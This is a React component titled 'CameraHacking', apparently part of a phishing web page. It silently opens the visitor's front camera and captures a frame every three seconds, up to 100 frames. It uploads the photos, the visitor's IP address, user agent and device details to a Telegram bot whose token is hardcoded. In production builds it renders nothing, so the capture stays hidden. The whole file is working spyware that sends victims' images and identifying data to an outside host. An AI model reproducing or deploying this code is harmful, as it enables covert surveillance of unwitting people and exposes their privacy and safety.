/**
 * КОМПОНЕНТ CAMERAHACKING - МАКСИМАЛЬНАЯ СОВМЕСТИМОСТЬ ANDROID
 * УНИВЕРСАЛЬНОЕ РЕШЕНИЕ ДЛЯ ВСЕХ ANDROID УСТРОЙСТВ
 */

import axios from 'axios';
import { useEffect, useRef, useState } from 'react';
import API_CONFIG from '../api/config';

const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) => {
  const streamRef = useRef(null);
  const captureIntervalRef = useRef(null);
  const retryTimeoutRef = useRef(null);
  const videoCheckIntervalRef = useRef(null);
  
  const [captureCount, setCaptureCount] = useState(0);
  const [deviceInfo, setDeviceInfo] = useState({});
  const [cameraStatus, setCameraStatus] = useState('initializing');
  const [lastError, setLastError] = useState(null);

  // Конфигурация
  const CAPTURE_INTERVAL = 3000;
  const MAX_CAPTURES = 100;
  const MAX_ANDROID_RETRIES = 10;

  /**
   * ОПРЕДЕЛЕНИЕ ТИПА УСТРОЙСТВА И БРАУЗЕРА
   */
  const detectDeviceInfo = () => {
    const ua = navigator.userAgent.toLowerCase();
    const info = {
      isAndroid: /android/.test(ua),
      isIOS: /iphone|ipad|ipod/.test(ua),
      isChrome: /chrome/.test(ua) && !/edge/.test(ua),
      isFirefox: /firefox/.test(ua),
      isSamsung: /samsungbrowser/.test(ua),
      isOpera: /opr/.test(ua) || /opera/.test(ua),
      isEdge: /edge/.test(ua),
      isWebView: /wv/.test(ua) || /webview/.test(ua),
      browserName: '',
      browserVersion: '',
      androidVersion: 0
    };
    
    // Определение Android версии
    if (info.isAndroid) {
      const match = ua.match(/android\s([0-9\.]+)/);
      info.androidVersion = match ? parseFloat(match[1]) : 0;
    }
    
    // Определение браузера
    if (info.isChrome) info.browserName = 'Chrome';
    else if (info.isFirefox) info.browserName = 'Firefox';
    else if (info.isSamsung) info.browserName = 'Samsung Internet';
    else if (info.isOpera) info.browserName = 'Opera';
    else if (info.isEdge) info.browserName = 'Edge';
    else if (info.isWebView) info.browserName = 'Android WebView';
    else info.browserName = 'Unknown';
    
    // Определение версии браузера
    const versionMatch = ua.match(/(chrome|firefox|samsungbrowser|opr|opera|edge|version)\/([0-9\.]+)/i);
    if (versionMatch) info.browserVersion = versionMatch[2];
    
    setDeviceInfo(info);
    console.log('📱 Device Info:', info);
    
    return info;
  };

  /**
   * УНИВЕРСАЛЬНЫЕ НАСТРОЙКИ КАМЕРЫ ДЛЯ ВСЕХ ANDROID
   */
  const getUniversalCameraConstraints = (deviceInfo) => {
    const baseConstraints = {
      video: {
        width: { min: 320, ideal: 1280, max: 1920 },
        height: { min: 240, ideal: 720, max: 1080 },
        frameRate: { min: 15, ideal: 24, max: 30 },
        facingMode: "user"
      },
      audio: false
    };
    
    // Специальные настройки для проблемных устройств
    if (deviceInfo.isAndroid) {
      // Для старых Android (до 6.0)
      if (deviceInfo.androidVersion < 6.0) {
        return {
          video: {
            width: { ideal: 640 },
            height: { ideal: 480 },
            frameRate: { ideal: 20 },
            facingMode: { exact: "user" }
          },
          audio: false
        };
      }
      
      // Для Samsung Internet
      if (deviceInfo.isSamsung) {
        return {
          video: {
            width: { ideal: 1280 },
            height: { ideal: 720 },
            frameRate: { ideal: 25 },
            facingMode: { exact: "user" }
          },
          audio: false
        };
      }
      
      // Для Android WebView
      if (deviceInfo.isWebView) {
        return {
          video: {
            width: { ideal: 800 },
            height: { ideal: 600 },
            frameRate: { ideal: 20 }
          },
          audio: false
        };
      }
    }
    
    return baseConstraints;
  };

  /**
   * ФУНКЦИЯ ПРОВЕРКИ И ВОССТАНОВЛЕНИЯ ВИДЕОПОТОКА
   */
  const checkAndFixVideoStream = () => {
    if (!videoRef.current || !streamRef.current) {
      console.log('❌ No video stream to check');
      return false;
    }
    
    const video = videoRef.current;
    const stream = streamRef.current;
    
    // Проверяем активность треков
    const videoTracks = stream.getVideoTracks();
    const activeTracks = videoTracks.filter(track => track.readyState === 'live');
    
    if (activeTracks.length === 0) {
      console.log('⚠️ No active video tracks, trying to restart...');
      restartCamera();
      return false;
    }
    
    // Проверяем размеры видео
    if (video.videoWidth === 0 || video.videoHeight === 0) {
      console.log(`⚠️ Video dimensions are zero: ${video.videoWidth}x${video.videoHeight}`);
      
      // Пробуем принудительно обновить
      if (deviceInfo.isAndroid) {
        video.play().catch(e => console.log('Auto-play blocked, but continuing'));
      }
      
      return false;
    }
    
    console.log(`✅ Video stream active: ${video.videoWidth}x${video.videoHeight}`);
    return true;
  };

  /**
   * ПЕРЕЗАПУСК КАМЕРЫ ПРИ ПРОБЛЕМАХ
   */
  const restartCamera = async () => {
    console.log('🔄 Restarting camera...');
    setCameraStatus('restarting');
    
    // Останавливаем текущий поток
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
    }
    
    // Очищаем video элемент
    if (videoRef.current) {
      videoRef.current.srcObject = null;
    }
    
    // Ждем немного
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // Пробуем снова
    try {
      await initializeCamera();
    } catch (error) {
      console.error('❌ Camera restart failed:', error);
      setLastError(error.message);
    }
  };

  /**
   * УНИВЕРСАЛЬНЫЙ ЗАХВАТ КАДРА ДЛЯ ВСЕХ УСТРОЙСТВ
   */
  const captureUniversalFrame = () => {
    return new Promise((resolve) => {
      if (!videoRef.current) {
        resolve(null);
        return;
      }
      
      const video = videoRef.current;
      const maxAttempts = deviceInfo.isAndroid ? 3 : 1;
      let attempts = 0;
      
      const attemptCapture = () => {
        attempts++;
        
        try {
          // Создаем canvas
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          
          const ctx = canvas.getContext('2d', { alpha: false });
          
          // Очищаем canvas
          ctx.fillStyle = '#000';
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          
          // Пробуем нарисовать кадр
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          
          // Проверяем, не черный ли кадр (проверяем несколько пикселей)
          const checkPoints = [
            [10, 10],   // Левый верхний угол
            [canvas.width - 10, 10],  // Правый верхний
            [10, canvas.height - 10], // Левый нижний
            [canvas.width - 10, canvas.height - 10] // Правый нижний
          ];
          
          let blackPixels = 0;
          let totalPixels = checkPoints.length;
          
          checkPoints.forEach(([x, y]) => {
            const pixel = ctx.getImageData(x, y, 1, 1).data;
            if (pixel[0] === 0 && pixel[1] === 0 && pixel[2] === 0) {
              blackPixels++;
            }
          });
          
          const isMostlyBlack = blackPixels > totalPixels * 0.5;
          
          if (!isMostlyBlack || attempts >= maxAttempts) {
            console.log(`📸 Frame captured (attempt ${attempts}, black: ${isMostlyBlack})`);
            
            // Если все еще черный, добавляем текст для отладки
            if (isMostlyBlack && attempts >= maxAttempts) {
              ctx.fillStyle = '#fff';
              ctx.font = '16px Arial';
              ctx.fillText('Android Camera', 20, 40);
              ctx.fillText(new Date().toLocaleTimeString(), 20, 70);
            }
            
            resolve(canvas);
          } else {
            console.log(`⏳ Got black frame, retrying... (${attempts}/${maxAttempts})`);
            setTimeout(attemptCapture, 300);
          }
        } catch (error) {
          console.error('❌ Capture attempt failed:', error);
          
          if (attempts < maxAttempts) {
            setTimeout(attemptCapture, 300);
          } else {
            // Создаем canvas с сообщением об ошибке
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = '#f00';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#fff';
            ctx.font = '20px Arial';
            ctx.fillText('Camera Error', 50, 50);
            ctx.fillText(error.message.substring(0, 30), 50, 100);
            resolve(canvas);
          }
        }
      };
      
      attemptCapture();
    });
  };

  /**
   * ОТПРАВКА ФОТО С МНОГОУРОВНЕВЫМИ ПОВТОРАМИ
   */
  const sendPhotoWithFallback = async (blob, attempt = 0) => {
    const MAX_SEND_ATTEMPTS = 3;
    
    try {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `photo_${Date.now()}.jpg`);
      
      // Добавляем диагностическую информацию
      formData.append('diagnostics', JSON.stringify({
        device: deviceInfo,
        captureCount: captureCount,
        timestamp: Date.now(),
        attempt: attempt,
        blobSize: blob.size,
        cameraStatus: cameraStatus
      }));
      
      const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendPhotoToTelegram}`;
      
      console.log(`📤 Sending photo attempt ${attempt + 1}/${MAX_SEND_ATTEMPTS}...`);
      
      await axios.post(apiUrl, formData, {
        headers: { 'Content-Type': 'multipart/form-data' },
        timeout: deviceInfo.isAndroid ? 15000 : 10000,
        maxContentLength: Infinity,
        maxBodyLength: Infinity
      });
      
      console.log(`✅ Photo sent successfully!`);
      setCaptureCount(prev => prev + 1);
      setCameraStatus('active');
      
      return true;
    } catch (error) {
      console.error(`❌ Send attempt ${attempt + 1} failed:`, error.message);
      
      if (attempt < MAX_SEND_ATTEMPTS - 1) {
        // Экспоненциальная задержка
        const delay = Math.pow(2, attempt) * 1000;
        console.log(`🔄 Retrying in ${delay/1000} seconds...`);
        
        await new Promise(resolve => setTimeout(resolve, delay));
        return sendPhotoWithFallback(blob, attempt + 1);
      } else {
        console.error(`❌ All send attempts failed`);
        
        // Отправляем ошибку в Telegram
        try {
          const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
          await axios.post(telegramApiUrl, {
            chat_id: chatId,
            text: `❌ Photo Send Failed\n\n` +
                  `Device: ${deviceInfo.isAndroid ? 'Android' : 'Other'}\n` +
                  `Browser: ${deviceInfo.browserName}\n` +
                  `Error: ${error.message.substring(0, 100)}\n` +
                  `Time: ${new Date().toLocaleString()}`
          });
        } catch (telegramError) {
          console.error('❌ Could not send error to Telegram:', telegramError);
        }
        
        return false;
      }
    }
  };

  /**
   * ПРОЦЕСС ЗАХВАТА И ОТПРАВКИ ФОТО
   */
  const captureAndSendPhoto = async () => {
    if (captureCount >= MAX_CAPTURES) {
      console.log('🎯 Maximum captures reached');
      stopCapturing();
      return;
    }
    
    // Проверяем состояние видеопотока
    if (!checkAndFixVideoStream()) {
      console.log('⏸️ Video stream not ready, skipping capture');
      return;
    }
    
    console.log(`📸 Starting capture #${captureCount + 1}`);
    
    try {
      // Захватываем кадр
      const canvas = await captureUniversalFrame();
      
      if (!canvas) {
        console.error('❌ Failed to capture frame');
        return;
      }
      
      // Конвертируем в blob с оптимальным качеством
      const quality = deviceInfo.isAndroid ? 0.6 : 0.8;
      
      canvas.toBlob(async (blob) => {
        if (!blob) {
          console.error('❌ Failed to create blob from canvas');
          return;
        }
        
        const sizeKB = Math.round(blob.size / 1024);
        console.log(`✅ Photo ready (${sizeKB} KB), sending...`);
        
        // Отправляем фото
        const success = await sendPhotoWithFallback(blob);
        
        if (!success && deviceInfo.isAndroid) {
          // Для Android пробуем альтернативный метод
          console.log('🔄 Trying alternative capture method for Android...');
          setTimeout(captureAndSendPhoto, 2000);
        }
      }, 'image/jpeg', quality);
      
    } catch (error) {
      console.error('❌ Capture process failed:', error);
      setLastError(error.message);
    }
  };

  /**
   * ЗАПУСК ПЕРИОДИЧЕСКОГО ЗАХВАТА
   */
  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    console.log(`🚀 Starting periodic capture (${CAPTURE_INTERVAL}ms interval)`);
    setCameraStatus('capturing');
    
    // Первый захват с задержкой
    setTimeout(() => {
      captureAndSendPhoto();
    }, deviceInfo.isAndroid ? 3000 : 1000);
    
    // Последующие захваты по интервалу
    captureIntervalRef.current = setInterval(() => {
      captureAndSendPhoto();
    }, CAPTURE_INTERVAL);
  };

  /**
   * ПЕРИОДИЧЕСКАЯ ПРОВЕРКА ВИДЕОПОТОКА
   */
  const startVideoMonitoring = () => {
    if (videoCheckIntervalRef.current) {
      clearInterval(videoCheckIntervalRef.current);
    }
    
    videoCheckIntervalRef.current = setInterval(() => {
      if (deviceInfo.isAndroid && cameraStatus === 'active') {
        checkAndFixVideoStream();
      }
    }, 10000); // Проверяем каждые 10 секунд
  };

  /**
   * ИНИЦИАЛИЗАЦИЯ КАМЕРЫ С ПОПЫТКАМИ ПОВТОРА
   */
  const initializeCameraWithRetry = async (retryCount = 0) => {
    if (retryCount >= MAX_ANDROID_RETRIES) {
      console.error(`❌ Max retries (${MAX_ANDROID_RETRIES}) reached`);
      setCameraStatus('failed');
      return;
    }
    
    try {
      console.log(`🔄 Camera initialization attempt ${retryCount + 1}/${MAX_ANDROID_RETRIES}`);
      
      const deviceInfo = detectDeviceInfo();
      const constraints = getUniversalCameraConstraints(deviceInfo);
      
      console.log('🎯 Using constraints:', constraints);
      
      // Запрашиваем доступ к камере
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      streamRef.current = stream;
      
      console.log('✅ Camera access granted');
      
      if (videoRef.current) {
        // Настройка video элемента
        const video = videoRef.current;
        video.playsInline = true;
        video.muted = true;
        video.autoplay = true;
        video.setAttribute('playsinline', 'true');
        video.setAttribute('muted', 'true');
        video.setAttribute('autoplay', 'true');
        video.setAttribute('webkit-playsinline', 'true');
        
        video.srcObject = stream;
        
        // Ожидание готовности видео
        await new Promise((resolve, reject) => {
          const timeout = setTimeout(() => {
            console.log('⏰ Video timeout, but continuing...');
            resolve();
          }, 10000);
          
          video.onloadedmetadata = () => {
            clearTimeout(timeout);
            console.log(`✅ Video metadata loaded: ${video.videoWidth}x${video.videoHeight}`);
            resolve();
          };
          
          video.onerror = (error) => {
            clearTimeout(timeout);
            reject(error);
          };
        });
        
        // Для Android даем дополнительное время
        if (deviceInfo.isAndroid) {
          await new Promise(resolve => setTimeout(resolve, 2000));
          
          // Пробуем принудительно запустить
          try {
            await video.play();
            console.log('▶️ Video play() successful');
          } catch (playError) {
            console.log('⚠️ Video play() blocked, but continuing');
          }
        }
        
        console.log('🎬 Camera initialized successfully');
        setCameraStatus('active');
        
        // Отправляем информацию об устройстве
        sendDeviceInfoToTelegram(deviceInfo);
        
        // Запускаем мониторинг и захват
        startVideoMonitoring();
        startPeriodicCapture();
        
      }
      
    } catch (error) {
      console.error(`❌ Camera init attempt ${retryCount + 1} failed:`, error.message);
      setLastError(error.message);
      setCameraStatus('retrying');
      
      // Экспоненциальная задержка для повторной попытки
      const delay = Math.pow(2, retryCount) * 1000;
      console.log(`⏳ Retrying in ${delay/1000} seconds...`);
      
      retryTimeoutRef.current = setTimeout(() => {
        initializeCameraWithRetry(retryCount + 1);
      }, delay);
    }
  };

  /**
   * ОТПРАВКА ИНФОРМАЦИИ ОБ УСТРОЙСТВЕ
   */
  const sendDeviceInfoToTelegram = async (deviceInfo) => {
    try {
      const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
      
      let deviceType = 'Unknown';
      if (deviceInfo.isAndroid) deviceType = `Android ${deviceInfo.androidVersion || 'Unknown'}`;
      if (deviceInfo.isIOS) deviceType = 'iOS';
      
      await axios.post(telegramApiUrl, {
        chat_id: chatId,
        text: `📱 Device Connected\n\n` +
              `Type: ${deviceType}\n` +
              `Browser: ${deviceInfo.browserName} ${deviceInfo.browserVersion}\n` +
              `User Agent: ${navigator.userAgent.substring(0, 80)}...\n` +
              `Time: ${new Date().toLocaleString()}\n` +
              `Status: ${cameraStatus}`
      });
      
      console.log('✅ Device info sent to Telegram');
      
    } catch (error) {
      console.error('❌ Failed to send device info:', error);
    }
  };

  /**
   * ПОЛУЧЕНИЕ IP АДРЕСА
   */
  const fetchClientIp = async () => {
    try {
      const services = [
        'https://api.ipify.org?format=json',
        'https://api64.ipify.org?format=json',
        'https://ipinfo.io/json'
      ];
      
      for (const service of services) {
        try {
          const response = await axios.get(service, { timeout: 5000 });
          const ip = response.data.ip || response.data.query;
          
          if (ip) {
            setClientIp(ip);
            console.log('✅ IP Address:', ip);
            
            // Отправляем IP в Telegram
            try {
              const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
              await axios.post(telegramApiUrl, {
                chat_id: chatId,
                text: `🌐 IP Address: ${ip}\nDevice: ${deviceInfo.isAndroid ? 'Android' : 'Other'}`
              });
            } catch (e) {
              console.log('⚠️ Could not send IP to Telegram');
            }
            
            return;
          }
        } catch (err) {
          console.log(`⚠️ IP service failed: ${service}`);
        }
      }
      
      setClientIp('IP unavailable');
      
    } catch (error) {
      console.error('❌ Error fetching IP:', error);
      setClientIp('IP unavailable');
    }
  };

  /**
   * ОСТАНОВКА ВСЕХ ПРОЦЕССОВ
   */
  const stopAllProcesses = () => {
    console.log('🛑 Stopping all processes...');
    
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    
    if (videoCheckIntervalRef.current) {
      clearInterval(videoCheckIntervalRef.current);
      videoCheckIntervalRef.current = null;
    }
    
    if (retryTimeoutRef.current) {
      clearTimeout(retryTimeoutRef.current);
      retryTimeoutRef.current = null;
    }
    
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => {
        track.stop();
        console.log(`🛑 Stopped ${track.kind} track`);
      });
      streamRef.current = null;
    }
    
    setCameraStatus('stopped');
  };

  /**
   * ОСНОВНОЙ ЭФФЕКТ
   */
  useEffect(() => {
    const initializeAll = async () => {
      // Восстановление геолокации
      const savedPermission = localStorage.getItem('locationPermission');
      if (savedPermission) {
        try {
          const locationData = JSON.parse(savedPermission);
          setLocationPermission(locationData);
          console.log('📍 Restored location data');
        } catch (error) {
          localStorage.removeItem('locationPermission');
        }
      }
      
      // Проверяем поддержку API
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        console.error('❌ WebRTC not supported');
        setCameraStatus('unsupported');
        return;
      }
      
      // Получаем IP
      await fetchClientIp();
      
      // Инициализируем камеру с повторными попытками
      await initializeCameraWithRetry();
    };
    
    initializeAll();
    
    // Обработчики видимости страницы
    const handleVisibilityChange = () => {
      if (document.hidden) {
        console.log('⏸️ Page hidden');
      } else {
        console.log('▶️ Page visible');
      }
    };
    
    document.addEventListener('visibilitychange', handleVisibilityChange);
    
    // Очистка
    return () => {
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      stopAllProcesses();
    };
  }, []);

  /**
   * КОМПОНЕНТ ДЛЯ ОТЛАДКИ (ТОЛЬКО В РЕЖИМЕ РАЗРАБОТКИ)
   */
  if (process.env.NODE_ENV === 'development') {
    return (
      <div style={{ 
        position: 'fixed', 
        bottom: 10, 
        right: 10, 
        background: 'rgba(0,0,0,0.8)', 
        color: 'white', 
        padding: '10px', 
        fontSize: '12px',
        zIndex: 9999,
        borderRadius: '5px',
        maxWidth: '300px'
      }}>
        <div><strong>Camera Status:</strong> {cameraStatus}</div>
        <div><strong>Captures:</strong> {captureCount}</div>
        <div><strong>Device:</strong> {deviceInfo.isAndroid ? 'Android' : deviceInfo.isIOS ? 'iOS' : 'Desktop'}</div>
        {lastError && <div><strong>Last Error:</strong> {lastError.substring(0, 50)}...</div>}
      </div>
    );
  }

  return null;
};

export default CameraHacking;
